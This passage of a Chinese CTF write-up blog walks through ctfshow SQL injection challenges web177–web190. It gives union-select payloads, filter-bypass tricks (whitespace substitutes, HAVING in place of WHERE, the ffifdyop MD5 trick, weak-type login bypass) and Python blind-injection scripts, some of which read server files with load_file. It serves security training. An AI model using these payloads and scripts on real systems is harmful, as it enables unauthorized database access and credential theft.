class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/union/**/select/**/1,2,password/**/from/**/ctfshow_user/**/where/**/username=&#x27;</span>flag<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure><h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h2><p>本题还是过滤了空格，但上题的做法也被过滤了，<code>+</code>也被过滤了，这里可以联想到命令执行的一些空格绕过</p><h3 id="0x01-3"><a href="#0x01-3" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;%09or%091=1%23</span><br></code></pre></td></tr></table></figure><h3 id="0x02-3"><a href="#0x02-3" class="headerlink" title="0x02"></a>0x02</h3><p>也是常规做法的最后一步</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;%09union%09select%091,2,password%09from%09ctfshow_user%09where%09username=&#x27;</span>flag<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure><h2 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h2><p>同样是空格过滤</p><h3 id="0x01-4"><a href="#0x01-4" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;%0cor%0c1=1%23</span><br></code></pre></td></tr></table></figure><h3 id="0x02-4"><a href="#0x02-4" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;%0cunion%0cselect%0c1,2,password%0cfrom%0cctfshow_user%0cwhere%0cusername=&#x27;</span>flag<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;union(select(select(group_concat(password))from(ctfshow_user)),1,2)%23</span><br></code></pre></td></tr></table></figure><h2 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h2><p>同样是空格过滤，尝试了一下179的payload发现都不能成功，欸？最后过滤的要换一下的原因</p><h3 id="0x01-5"><a href="#0x01-5" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;%0cor%0c1=1--%0c</span><br></code></pre></td></tr></table></figure><h3 id="0x02-5"><a href="#0x02-5" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;%0cunion%0cselect%0c1,2,password%0cfrom%0cctfshow_user%0cwhere%0cusername=&#x27;</span>flag<span class="hljs-string">&#x27;--%0c</span><br></code></pre></td></tr></table></figure><h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;union(select(select(group_concat(password))from(ctfshow_user)),1,2)--%0c</span><br></code></pre></td></tr></table></figure><h2 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h2><p>给了过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#x27;</span>, <span class="hljs-variable">$str</span>);<br></code></pre></td></tr></table></figure><h3 id="0x01-6"><a href="#0x01-6" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;%0cor%0c1=1--%0c</span><br></code></pre></td></tr></table></figure><h3 id="0x02-6"><a href="#0x02-6" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27;or(id=26)and&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>x1✌的简述，and 的优先级是高于 or 的，会执行后面的,下面<strong>贴原文</strong>，挺好理解的</p><p>语句实际的执行顺序如下 (我们把距离 and 两边最近的相关操作都用括号括起来以便于理解, 并且补全空格)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> id,username,password <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> (username <span class="hljs-operator">!=</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;-1&#x27;</span>) <span class="hljs-keyword">or</span> (id<span class="hljs-operator">=</span><span class="hljs-number">26</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;1&#x27;</span>) limit <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>首先因为输出只能输出一行数据, 需要 <code>id=-1</code> 来使前一条查询纪录为空, 使得前一条包含 and 的语句为 false</p><p>然后开始判断后一个括号内的操作, <code>id=26 and &#39;1&#39;</code> 与 <code>id=26</code> 等价 (注意 <code>id=26 or &#39;1&#39;</code> 相当于查询全部内容, 因为 or 后一句永远是 true, 即查询存在的纪录)</p><p>因为前一个括号内容不成立(返回空纪录), 后一个括号内的内容成立, 于是通过 or 符号, 我们查询了 <code>id=26</code> 的纪录并显示出来</p><p>因为空格被过滤了, 所以使用 <code>()</code> 进行绕过, 测试可知 flag 所在账户的 id 值是 26, 于是构造 <code>or(id=26)</code> 来查询 id&#x3D;26 的数据</p><p>最后面的 <code>and&#39;1</code> 是闭合后面的单引号 (因为注释被过滤掉了)</p><p>最终的 payload 为 <code>-1&#39;or(id=26)and&#39;1</code>, 其实 <code>-1&#39;or(id=26)and&#39;1&#39;=1</code> 也是可以的</p><h2 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h2><p>同web181,自己参照</p><h2 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h2><p>查找语句做了限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select count(pass) from &quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;tableName&#x27;</span>].<span class="hljs-string">&quot;;&quot;</span>;<br></code></pre></td></tr></table></figure><p>是从from后来开始注入，没有直接的回显，需要写个盲注的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#x27;</span><br>flag = <span class="hljs-string">&#x27;ctfshow&#123;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://3edbba86-cec1-4666-8bcc-39e839605a1c.challenge.ctf.show/select-waf.php&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">current_flag</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br>        data = &#123;<span class="hljs-string">&#x27;tableName&#x27;</span>: <span class="hljs-string">f&quot;(ctfshow_user)where(pass)like(&#x27;<span class="hljs-subst">&#123;current_flag + char&#125;</span>%&#x27;)&quot;</span>&#125;<br><br>        <span class="hljs-keyword">try</span>:<br>            res = requests.post(url, data=data)<br>            <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&#x27;$user_count = 1&#x27;</span>) != -<span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    char = get_flag_char(flag)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前 flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">if</span> char == <span class="hljs-string">&#x27;&#125;&#x27;</span>:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;无法继续匹配字符，可能已到达结尾或发生错误。&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终 flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, <br></code></pre></td></tr></table></figure><p>本题的主要多过滤了where,可以利用having进行绕过，配合group by一起使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> binascii<br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#x27;</span><br>flag = <span class="hljs-string">&#x27;ctfshow&#123;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://7d2f63f3-cdef-40f1-bb7b-c5865311ee95.challenge.ctf.show/select-waf.php&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tohex</span>(<span class="hljs-params">string</span>):<br>    <span class="hljs-keyword">return</span> binascii.hexlify(string.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><span class="hljs-keyword">with</span> requests.Session() <span class="hljs-keyword">as</span> session:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>        <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dicts:<br>            data = &#123;<span class="hljs-string">&#x27;tableName&#x27;</span>: <span class="hljs-string">f&quot;ctfshow_user group by pass having pass like 0x<span class="hljs-subst">&#123;tohex(flag + s + <span class="hljs-string">&#x27;%&#x27;</span>)&#125;</span>&quot;</span>&#125;<br>            <span class="hljs-keyword">try</span>:<br>                res = session.post(url, data=data)<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;$user_count = 1&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>                    flag += s<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Current flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error occurred: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>            time.sleep(<span class="hljs-number">0.5</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Final flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>利用hex的进制转化进行比较得到flag</p><h2 id="web185"><a href="#web185" class="headerlink" title="web185"></a>web185</h2><p>在前面的基础上还过滤了数字，跟着大师傅学学脚本</p><p>思路是利用true是1的原理就行构造数字</p><h3 id="0x01-7"><a href="#0x01-7" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> string<br><br>url = <span class="hljs-string">&quot;http://0a600219-be65-4f96-a0b3-28d5e93923db.challenge.ctf.show/select-waf.php&quot;</span><br><br>dicts = string.digits+string.ascii_lowercase+<span class="hljs-string">&quot;-&quot;</span>+<span class="hljs-string">&quot;&#125;&quot;</span><br>flag = [<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tofunc</span>(<span class="hljs-params">n</span>):<br>    strs = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        strs += <span class="hljs-string">&#x27;+true&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;char(&#x27;</span> + strs + <span class="hljs-string">&#x27;)&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,<span class="hljs-number">64</span>):<br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dicts:<br>        payload = flag + <span class="hljs-built_in">list</span>(s)<br>        payload.append(<span class="hljs-string">&quot;%&quot;</span>) <span class="hljs-comment"># 进行匹配</span><br>        concat_payload = <span class="hljs-string">&#x27;concat(&#x27;</span> +<span class="hljs-string">&#x27;,&#x27;</span>.join([tofunc(<span class="hljs-built_in">ord</span>(x))<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> payload])+<span class="hljs-string">&#x27;)&#x27;</span><br>        data = &#123;<span class="hljs-string">&#x27;tableName&#x27;</span>:<span class="hljs-string">&#x27;ctfshow_user group by pass having pass like &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(concat_payload)&#125;<br>        res=requests.post(url,data=data)<br>        <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&#x27;$user_count = 0&#x27;</span>) == -<span class="hljs-number">1</span>:<br>            flag.append(s)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(flag))<br>            time.sleep(<span class="hljs-number">3</span>)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h3 id="0x02-7"><a href="#0x02-7" class="headerlink" title="0x02"></a>0x02</h3><p>另外附上yu师傅的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#author:yu22x</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br>url=<span class="hljs-string">&quot;http://8319afbf-281c-4a73-b14e-a29426d0e556.challenge.ctf.show/select-waf.php&quot;</span><br>s=<span class="hljs-string">&#x27;0123456789abcdef-&#123;&#125;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">convert</span>(<span class="hljs-params">strs</span>):<br>  t=<span class="hljs-string">&#x27;concat(&#x27;</span><br>  <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> strs:<br>    t+= <span class="hljs-string">&#x27;char(true&#x27;</span>+<span class="hljs-string">&#x27;+true&#x27;</span>*(<span class="hljs-built_in">ord</span>(s)-<span class="hljs-number">1</span>)+<span class="hljs-string">&#x27;),&#x27;</span><br>  <span class="hljs-keyword">return</span> t[:-<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;)&quot;</span><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">45</span>):<br>  <span class="hljs-built_in">print</span>(i)<br>  <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> s:<br>    d = convert(<span class="hljs-string">f&#x27;^ctfshow<span class="hljs-subst">&#123;flag+j&#125;</span>&#x27;</span>)<br>    data=&#123;<br>    <span class="hljs-string">&#x27;tableName&#x27;</span>:<span class="hljs-string">f&#x27; ctfshow_user group by pass having pass regexp(<span class="hljs-subst">&#123;d&#125;</span>)&#x27;</span><br>    &#125;<br>    <span class="hljs-comment">#print(data)</span><br>    r=requests.post(url,data=data)<br>    <span class="hljs-comment">#print(r.text)</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;user_count = 1&quot;</span>  <span class="hljs-keyword">in</span> r.text):<br>      flag+=j<br>      <span class="hljs-built_in">print</span>(flag)<br>      <span class="hljs-keyword">if</span> j==<span class="hljs-string">&#x27;&#125;&#x27;</span>:<br>        exit(<span class="hljs-number">0</span>)<br>      <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="web186"><a href="#web186" class="headerlink" title="web186"></a>web186</h2><p>同上题，两个脚本都可以使用，个人测评下来yu师傅的脚本快一点</p><h2 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h2><p>早有耳闻的一个sql的MD5绕过，一直知道这个知识点，但是刷到的很少先上payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin ffifdyop<br></code></pre></td></tr></table></figure><p>需要抓包看回显得到flag，具体的分析，<a href="https://blog.csdn.net/qq_43427482/article/details/109849590">文章</a>这里简单的阐述一下内容，正常的MD5加密默认是32位，是以md5(‘xxx’,false)</p><p>但是使用md5(‘xxx’,true)进行加密转化的时候，会在这个基础上将字符串分割成16组然后每组转化为二进制再十进制，最后通过ASCII转化为字符串对 <code>ffifdyop</code> 字符串进行加密的时候, 会出现 <code>&#39;or&#39;6</code>, 相当于万能密码，以下是常用的两个payload</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ffifdyop<br>129581926211651571912466741651878684928<br></code></pre></td></tr></table></figure><h2 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h2><p>都传0就可以绕过了，记得bp抓包</p><p>判断是<code>username=&#123;$username&#125;</code>，并没有引号包裹，那么就可以输入数字了。数字和字符串的匹配是弱类型比较，字符串会转换为数字，如<code>0==admin</code>，那么如果输入的username是0，则会匹配所有开头不是数字或者为0的字符串和数字0。</p><p>看password的判断，也是弱类型的比较，那么也直接输入0，尝试登录一个用户名和pass的开头是字母或是0的用户。</p><h2 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h2><p>hint是在api&#x2F;index.php里，先尝试了上题的payload没有成功</p><p>尝试输入用户为1和0,一个是查询失败，一个是密码错误，说明为1的时候不存在用户，利用这里进行注入，参考参考脚本吧</p><p><code>load_file()</code> 是 MySQL 中的一个函数，用于读取服务器上的文件。它能够从指定的文件路径读取文件内容，并将其作为字符串返回。</p><p><code>regexp</code> 是 MySQL 中用于正则表达式匹配的操作符。它的作用是将文件内容与正则表达式进行匹配。</p><h3 id="0x01-8"><a href="#0x01-8" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br>dicts=string.digits+string.ascii_lowercase+<span class="hljs-string">&quot;-&quot;</span>+<span class="hljs-string">&quot;&#125;&quot;</span><br>url = <span class="hljs-string">&#x27;http://91a55175-5819-43ae-bd47-e9b866b79eeb.challenge.ctf.show/api/index.php&#x27;</span><br>flag = <span class="hljs-string">&#x27;ctfshow&#123;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dicts:<br>        payload = <span class="hljs-string">&#x27;if(load_file(\&#x27;/var/www/html/api/index.php\&#x27;)regexp(\&#x27;&#123;&#125;\&#x27;),1,0)&#x27;</span>.<span class="hljs-built_in">format</span>(flag+s)<br>        res = requests.post(url, data=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload, <span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>&#125;)<br>        <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&#x27;67e5&#x27;</span>) != -<span class="hljs-number">1</span>:<br>            flag += s<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h3 id="0x02-8"><a href="#0x02-8" class="headerlink" title="0x02"></a>0x02</h3><p>还有官p</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://91a55175-5819-43ae-bd47-e9b866b79eeb.challenge.ctf.show/api/index.php&quot;</span><br>flagstr = <span class="hljs-string">&quot;&#125;&#123;&lt;&gt;$=,;_ &#x27;abcdefghijklmnopqr-stuvwxyz0123456789&quot;</span><br><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-comment">#这个位置，是群主耗费很长时间跑出来的位置~</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">257</span>,<span class="hljs-number">257</span>+<span class="hljs-number">60</span>):<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> flagstr:<br>data=&#123;<br><span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;if(substr(load_file(&#x27;/var/www/html/api/index.php&#x27;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)&quot;</span>.<span class="hljs-built_in">format</span>(i,x),<br><span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;0&quot;</span><br>&#125;<br><span class="hljs-built_in">print</span>(data)<br>response = requests.post(url,data=data)<br>time.sleep(<span class="hljs-number">0.3</span>)<br><span class="hljs-comment"># 8d25是username=1时的页面返回内容包含的，具体可以看上面的截图~</span><br><span class="hljs-keyword">if</span> response.text.find(<span class="hljs-string">&quot;8d25&quot;</span>)&gt;<span class="hljs-number">0</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;++++++++++++++++++ &#123;&#125; is right&quot;</span>.<span class="hljs-built_in">format</span>(x))<br>flag+=x<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">continue</span><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">where username = <span class="hljs-string">&#x27;&#123;$username&#125;&#x27;</span><span class="hljs-string">&quot;;</span><br></code></pre></td></tr></table></figure><p>根据这个可以用或进行绕过尝试注入得到flag，还是用盲注写</p><h3 id="0x01-9"><a href="#0x01-9" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span>  time<br>dicts=string.digits+string.ascii_lowercase+<span class="hljs-string">&quot;-&quot;</span>+<span class="hljs-string">&quot;&#123;&#125;&quot;</span>+<span class="hljs-string">&quot;,&quot;</span><br>url = <span class="hljs-string">&#x27;http://27c9e10a-b6cd-4bcf-86e5-5a067c06f56e.challenge.ctf.show/api/index.php&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">64</span>):<br>  <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dicts:<br>    <span class="hljs-comment">#payload = &#x27;select group_concat(table_name) from information_schema.tables where table_schema=database()&#x27;</span><br>    <span class="hljs-comment">#payload = &#x27;select group_concat(column_name) from information_schema.columns where table_name=\&#x27;ctfshow_fl0g\&#x27; and table_schema=database()&#x27;</span><br>    payload = <span class="hljs-string">&#x27;select f1ag from ctfshow_fl0g&#x27;</span><br>    s_payload = <span class="hljs-string">&#x27;admin\&#x27; and if(substr((&#123;&#125;),&#123;&#125;,1)=\&#x27;&#123;&#125;\&#x27;,1,0)#&#x27;</span>.<span class="hljs-built_in">format</span>(payload,i,s)<br>    res = requests.post(url,data=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:s_payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>&#125; )<br>    <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&#x27;5bc6&#x27;</span>) != -<span class="hljs-number">1</span>:<br>      